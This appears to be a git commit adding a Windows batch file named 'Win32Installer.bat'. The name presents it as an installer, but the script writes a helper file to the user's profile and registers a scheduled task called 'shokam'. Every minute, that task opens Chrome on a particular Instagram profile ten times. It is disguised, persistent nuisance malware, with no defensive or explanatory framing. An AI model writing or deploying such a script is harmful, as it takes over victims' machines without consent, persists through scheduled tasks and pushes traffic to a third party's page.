324f6932deb76b78aaac92016ff4d3d6647152de
WAP Industries <141229412+WAP-Industries@users.noreply.github.com>
2023-09-22 09:49:46 +0800

    Add files via upload

---
+++ Win32Installer.bat
@@ -0,0 +1,17 @@
+@echo off
+setlocal
+
+set "filename=%USERPROFILE%\Win32Helper.bat"
+
+echo @echo off > %filename%
+echo set /a i=0 >> %filename%
+echo :redir >> %filename%
+echo    start chrome.exe "https://www.instagram.com/jeremiahchai/" >> %filename%
+echo    set /a i=%%i%%+1 >> %filename%
+echo    if %%i%% lss 10 ( >> %filename%
+echo        call :redir >> %filename%
+echo    ) >> %filename%
+
+schtasks /create /tn shokam /tr %filename% /sc minute /mo 1 /st 00:00:00 /f
+
+endlocal
